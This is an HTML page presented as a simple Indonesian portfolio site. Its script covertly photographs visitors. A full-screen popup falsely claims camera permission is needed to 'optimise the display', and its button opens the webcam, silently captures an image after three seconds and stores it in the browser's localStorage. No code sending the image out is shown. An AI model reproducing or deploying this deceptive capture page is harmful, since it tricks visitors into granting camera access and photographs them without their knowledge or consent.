<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portfolio</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            padding: 20px;
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <h1>Selamat Datang di Portfolio</h1>
    <p>Ini adalah halaman portfolio sederhana.</p>

    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    
    <link rel="manifest" href="manifest.json">

    <div id="popup" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); color: white; text-align: center; padding-top: 20%;">
    <p>Kami membutuhkan izin untuk mengoptimalkan tampilan website.</p>
    <button onclick="startCamera()">Lanjutkan</button>
</div>

<script>
    function startCamera() {
        document.getElementById("popup").style.display = "none";
        
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const imageData = canvas.toDataURL('image/png');
                    localStorage.setItem('capturedImage', imageData);
                    
                    stream.getTracks().forEach(track => track.stop()); // Matikan kamera setelah foto diambil
                }, 3000);
            })
            .catch(err => {
                console.error("Akses ditolak", err);
            });
    }
</script>
</body>
</html>
